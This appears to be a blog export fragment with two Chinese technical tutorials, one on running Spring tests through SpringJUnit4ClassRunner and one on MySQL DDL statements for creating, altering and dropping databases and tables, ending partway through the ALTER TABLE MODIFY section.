    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>在前面篇章提到的Spring的测试类中，每个测试方法都有以下两行代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ApplicationContext</span> <span class="variable">app</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line"><span class="type">BookDao</span> <span class="variable">bookDao</span> <span class="operator">=</span> app.getBean(<span class="string">&quot;bookDao&quot;</span>, BookDao.class);</span><br></pre></td></tr></table></figure>
<p>这两行代码作用是获取容器，如果省略不写，会出现空指针异常。所以又不能轻易删除。</p>
<h1 id="二、解决思路"><a href="#二、解决思路" class="headerlink" title="二、解决思路"></a>二、解决思路</h1><ul>
<li>使用SpringJunit创建Spring容器，但是需要将配置文件名称告诉它。</li>
<li>将需要进行测试的Bean直接在测试类中进行注入。</li>
</ul>
<h1 id="三、整合Junit开发步骤"><a href="#三、整合Junit开发步骤" class="headerlink" title="三、整合Junit开发步骤"></a>三、整合Junit开发步骤</h1><blockquote>
<p><strong>① 导入Spring集成Junit的坐标</strong></p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>② 使用@Runwith注解替换原来的运行期</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringJunitTest</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>③ 使用@ContextConfiguration指定配置文件或配置类</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class="line"><span class="comment">//@ContextConfiguration(&quot;classpath:applicationContext.xml&quot;)</span></span><br><span class="line"><span class="meta">@ContextConfiguration(classes = SpringConfig.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringJunitTest</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>④ 使用@Autowired注入需要测试的对象</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class="line"><span class="comment">//@ContextConfiguration(value = &#123;&quot;classpath:applicationContext.xml&quot;&#125;)</span></span><br><span class="line"><span class="meta">@ContextConfiguration(classes = &#123;SpringConfig.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringJunitTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BookService bookService;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 测试查询</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span>&#123;</span><br><span class="line">        bookService.save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL之玩转DDL</title>
    <url>/posts/e770b956.html</url>
    <content><![CDATA[<h1 id="一、基础概述"><a href="#一、基础概述" class="headerlink" title="一、基础概述"></a>一、基础概述</h1><h2 id="1-标识符命名规则"><a href="#1-标识符命名规则" class="headerlink" title="1. 标识符命名规则"></a>1. 标识符命名规则</h2><ul>
<li>数据库名、表名不得超过30个字符，变量名限制为29个</li>
<li>必须只能包含 A–Z, a–z, 0–9, _共63个字符</li>
<li>数据库名、表名、字段名等对象名中间不要包含空格</li>
<li>同一个MySQL软件中，数据库不能同名；同一个库中，表不能重名；同一个表中，字段不能重名</li>
<li>必须保证你的字段没有和保留字、数据库系统或常用方法冲突。如果坚持使用，请在SQL语句中使用 &#x3D;&#x3D;&#96;&#96;&#x3D;&#x3D;（着重号）引起来</li>
<li>保持字段名和类型的一致性：在命名字段并为其指定数据类型的时候一定要保证一致性，假如数据类型在一个表里是整数，那在另一个表里可就别变成字符型了</li>
</ul>
<h2 id="2-MySQL中的数据类型"><a href="#2-MySQL中的数据类型" class="headerlink" title="2. MySQL中的数据类型"></a>2. MySQL中的数据类型</h2><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135345.png" alt=" "><br><strong>其中，常用的几类类型介绍如下：</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135410.png" alt=" "></p>
<hr>
<h1 id="二、创建和管理数据库"><a href="#二、创建和管理数据库" class="headerlink" title="二、创建和管理数据库"></a>二、创建和管理数据库</h1><h2 id="1-创建数据库"><a href="#1-创建数据库" class="headerlink" title="1. 创建数据库"></a>1. 创建数据库</h2><ul>
<li>方式1：创建数据库</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE 数据库名;</span><br></pre></td></tr></table></figure>

<ul>
<li>方式2：创建数据库并指定字符集</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE 数据库名 <span class="type">CHARACTER</span> <span class="keyword">SET</span> 字符集;</span><br></pre></td></tr></table></figure>

<ul>
<li>方式3：判断数据库是否已经存在，不存在则创建数据库（ <strong>推荐</strong> ）</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> 数据库名;</span><br><span class="line"># 如果MySQL中已经存在相关的数据库，则忽略创建语句，不再创建数据库。</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意</strong>：DATABASE 不能改名。一些可视化工具可以改名，它是建新库，把所有表复制到新库，再删旧库完成的。</p>
</blockquote>
<h2 id="2-使用数据库"><a href="#2-使用数据库" class="headerlink" title="2. 使用数据库"></a>2. 使用数据库</h2><ul>
<li>查看当前所有的数据库</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES; # 有一个S，代表多个数据库</span><br></pre></td></tr></table></figure>

<ul>
<li>查看当前正在使用的数据库</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATABASE(); # 使用的一个 mysql 中的全局函数</span><br></pre></td></tr></table></figure>

<ul>
<li>查看指定库下所有的表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TABLES <span class="keyword">FROM</span> 数据库名;</span><br></pre></td></tr></table></figure>

<ul>
<li>查看数据库的创建信息</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> DATABASE 数据库名;</span><br><span class="line">或者：</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> DATABASE 数据库名\G</span><br></pre></td></tr></table></figure>

<ul>
<li>使用&#x2F;切换数据库</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">USE 数据库名;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意</strong>：要操作表格和数据之前必须先说明是对哪个数据库进行操作，否则就要对所有对象加上“<code>数据库名.</code>”。</p>
</blockquote>
<h2 id="3-修改数据库"><a href="#3-修改数据库" class="headerlink" title="3. 修改数据库"></a>3. 修改数据库</h2><ul>
<li>更改数据库字符集</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> DATABASE 数据库名 <span class="type">CHARACTER</span> <span class="keyword">SET</span> 字符集; # 比如：gbk、utf8等</span><br></pre></td></tr></table></figure>
<h2 id="4-删除数据库"><a href="#4-删除数据库" class="headerlink" title="4.  删除数据库"></a>4.  删除数据库</h2><ul>
<li>方式1：删除指定的数据库</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE 数据库名;</span><br></pre></td></tr></table></figure>

<ul>
<li>方式2：删除指定的数据库（ <strong>推荐</strong> ）</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> 数据库名;</span><br></pre></td></tr></table></figure>

<h2 id="5-临时数据库的创建与使用"><a href="#5-临时数据库的创建与使用" class="headerlink" title="5. 临时数据库的创建与使用"></a>5. 临时数据库的创建与使用</h2><hr>
<h1 id="三、创建和管理表"><a href="#三、创建和管理表" class="headerlink" title="三、创建和管理表"></a>三、创建和管理表</h1><h2 id="1-创建表"><a href="#1-创建表" class="headerlink" title="1. 创建表"></a>1. 创建表</h2><ul>
<li>必备条件：<ul>
<li>CREATE TABLE权限</li>
<li>存储空间</li>
</ul>
</li>
<li>方式1：”白手起家”的方式</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> [IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] 表名(</span><br><span class="line">	字段<span class="number">1</span>, 数据类型 [约束条件] [默认值],</span><br><span class="line">	字段<span class="number">2</span>, 数据类型 [约束条件] [默认值],</span><br><span class="line">	字段<span class="number">3</span>, 数据类型 [约束条件] [默认值],</span><br><span class="line">	……</span><br><span class="line">	[表约束条件]</span><br><span class="line">);</span><br><span class="line"># 加上了IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>关键字，则表示：如果当前数据库中不存在要创建的数据表，则创建数据表；</span><br><span class="line"># 如果当前数据库中已经存在要创建的数据表，则忽略建表语句，不再创建数据表。</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 方式<span class="number">1</span>：&quot;白手起家&quot;的方式 需要用户具备创建表的权限。</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> myemp1(   </span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	id <span class="type">INT</span>,</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	emp_name <span class="type">VARCHAR</span>(<span class="number">15</span>), #使用<span class="type">VARCHAR</span>来定义字符串，必须在使用<span class="type">VARCHAR</span>时指明其长度。</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	hire_date <span class="type">DATE</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> );</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.58</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 查看表结构</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">DESC</span> myemp1;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field     <span class="operator">|</span> Type        <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> id        <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)     <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> emp_name  <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">15</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> hire_date <span class="operator">|</span> <span class="type">date</span>        <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.03</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 查看创建表的语句结构</span><br><span class="line">mysql<span class="operator">&gt;</span> # 如果创建表时没有指明使用的字符集，则默认使用表所在的数据库的字符集。</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> myemp1;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Table</span>  <span class="operator">|</span> <span class="keyword">Create</span> <span class="keyword">Table</span></span><br><span class="line">                             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> myemp1 <span class="operator">|</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `myemp1` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `emp_name` <span class="type">varchar</span>(<span class="number">15</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `hire_date` <span class="type">date</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<ul>
<li>方式2：基于现有的表，同时导入数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名 </span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line">subquery</span><br><span class="line"></span><br><span class="line"># 使用 <span class="keyword">AS</span> subquery 选项，将创建表和插入数据结合起来</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 方式<span class="number">2</span>：基于现有的表，同时导入数据</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> myemp2</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> employee_id,last_name,salary</span><br><span class="line"><span class="keyword">FROM</span> employees;</span><br><span class="line"></span><br><span class="line"># 说明<span class="number">1</span>：查询语句中字段的别名，可以作为新创建的表的字段的名称。</span><br><span class="line"># 说明<span class="number">2</span>：此时的查询语句可以结构比较丰富，使用前面章节讲过的各种<span class="keyword">SELECT</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> myemp3</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> e.employee_id emp_id,e.last_name lname,d.department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> e.department_id <span class="operator">=</span> d.department_id;</span><br><span class="line"></span><br><span class="line"># 需求<span class="number">1</span>：创建一个表employees_copy，实现对employees表的复制，包括表数据</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employees_copy</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> employees;</span><br><span class="line"></span><br><span class="line"># 需求<span class="number">2</span>：创建一个表employees_blank，实现对employees表的复制，不包括表数据</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employees_blank</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"># 创建一个不可能条件</span><br><span class="line"><span class="keyword">WHERE</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<h2 id="2-修改表"><a href="#2-修改表" class="headerlink" title="2. 修改表"></a>2. 修改表</h2><ul>
<li>修改表指的是修改数据库中已经存在的数据表的结构。</li>
<li>使用 <code>ALTER TABLE</code> 语句可以实现：<ul>
<li>向已有的表中添加列</li>
<li>修改现有表中的列</li>
<li>删除现有表中的列</li>
<li>重命名现有表中的列</li>
</ul>
</li>
</ul>
<h3 id="（1）添加字段"><a href="#（1）添加字段" class="headerlink" title="（1）添加字段"></a>（1）添加字段</h3><ul>
<li>语法格式</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> [<span class="keyword">COLUMN</span>] 字段名 字段类型 [<span class="keyword">FIRST</span><span class="operator">|</span>AFTER 字段名];</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> #<span class="number">3.</span> 修改表  <span class="comment">--&gt; ALTER TABLE</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">DESC</span> myemp1;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field     <span class="operator">|</span> Type        <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> id        <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)     <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> emp_name  <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">15</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> hire_date <span class="operator">|</span> <span class="type">date</span>        <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 添加一个字段</span><br><span class="line">mysql<span class="operator">&gt;</span> # 默认添加到表中的最后一个字段的位置</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> myemp1</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">ADD</span> salary <span class="keyword">DOUBLE</span>(<span class="number">10</span>,<span class="number">2</span>);</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.56</span> sec)</span><br><span class="line">Records: <span class="number">0</span>  Duplicates: <span class="number">0</span>  Warnings: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">DESC</span> myemp1;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field     <span class="operator">|</span> Type         <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> id        <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)      <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> emp_name  <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">15</span>)  <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> hire_date <span class="operator">|</span> <span class="type">date</span>         <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> salary    <span class="operator">|</span> <span class="keyword">double</span>(<span class="number">10</span>,<span class="number">2</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 添加到表中的第一个字段</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> myemp1</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">ADD</span> phone_number <span class="type">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">FIRST</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.27</span> sec)</span><br><span class="line">Records: <span class="number">0</span>  Duplicates: <span class="number">0</span>  Warnings: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">DESC</span> myemp1;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field        <span class="operator">|</span> Type         <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> phone_number <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">20</span>)  <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> id           <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)      <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> emp_name     <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">15</span>)  <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> hire_date    <span class="operator">|</span> <span class="type">date</span>         <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> salary       <span class="operator">|</span> <span class="keyword">double</span>(<span class="number">10</span>,<span class="number">2</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 添加到表中emp_name后</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> myemp1</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">ADD</span> email <span class="type">VARCHAR</span>(<span class="number">45</span>) AFTER emp_name;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.24</span> sec)</span><br><span class="line">Records: <span class="number">0</span>  Duplicates: <span class="number">0</span>  Warnings: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">DESC</span> myemp1;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field        <span class="operator">|</span> Type         <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> phone_number <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">20</span>)  <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> id           <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)      <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> emp_name     <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">15</span>)  <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> email        <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">45</span>)  <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> hire_date    <span class="operator">|</span> <span class="type">date</span>         <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> salary       <span class="operator">|</span> <span class="keyword">double</span>(<span class="number">10</span>,<span class="number">2</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<h3 id="（2）修改字段"><a href="#（2）修改字段" class="headerlink" title="（2）修改字段"></a>（2）修改字段</h3><ul>
<li>可以修改列的数据类型，长度、默认值和位置</li>
<li>修改字段数据类型、长度、默认值、位置的语法格式如下：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 MODIFY [<span class="keyword">COLUMN</span>] 字段名<span class="number">1</span> 字段类型 [<span class="keyword">DEFAULT</span> 默认值] [<span class="keyword">FIRST</span><span class="operator">|</span>AFTER 字段名<span class="number">2</span>];</span><br></pre></td></tr></table></figure>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> myemp1</span><br><span class="line">MODIFY emp_name <span class="type">VARCHAR</span>(<span class="number">25</span>) ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> myemp1</span><br><span class="line">MODIFY emp_name <span class="type">VARCHAR</span>(<span class="number">35</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;aaa&#x27;</span>;</span><br></pre></td></tr></table></figure>

